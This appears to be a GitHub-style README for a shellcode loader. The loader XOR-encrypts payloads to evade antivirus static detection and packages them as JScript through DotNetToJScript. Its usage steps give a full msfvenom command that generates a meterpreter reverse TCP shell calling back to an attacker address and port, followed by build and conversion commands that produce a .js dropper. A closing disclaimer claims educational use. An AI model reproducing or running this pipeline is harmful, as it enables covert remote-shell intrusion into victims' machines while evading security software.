
# XOR Encrypted Shellcode Loader for DotNetToJScript

This project provides a method for executing encrypted shellcode using a combination of XOR encryption and the DotNetToJScript tool. It's designed for users who need to execute shellcode within a .NET environment.

## Features

- XOR encryption of shellcode for AV static evasion.
- Integration with DotNetToJScript for seamless execution in a .NET context.

## Prerequisites

- Python 3 (for xor.py script)
- DotNetToJScript - https://github.com/tyranid/DotNetToJScript

## Usage

### Generating XOR Encrypted Shellcode

1. Generate your encrypted shellcode. The following example uses `msfvenom` and the provided Python script:

   ```
   msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.1 lport=1336 -f raw 2>/dev/null | python3 xor.py -t go -x 31 > meterpreter.txt
   ```

   Note: `31` is used as the encryption/decryption key - change this as you see fit.

### Setting Up DotNetToJScript

2. Import the `C#Shellcode Loader` into the DotNetToJScript solution, replacing `TestClass.cs`.

3. Build the solution in release mode.

### Execution

4. Copy `DotNetToJscript.exe` and `NDesk.Options.dll` to your designated folder.

5. Navigate to the `ExampleAssembly` folder and copy `ExampleAssembly.dll`. Ensure these DLL files are in the same directory as `DotNetToJScript.exe`.

6. Create the .js file using DotNetToJScript:

   ```
   DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
   ```

## Disclaimer

This tool is intended for educational and legal usage only. The author is not responsible for misuse or for any damage that may be caused by the tool.
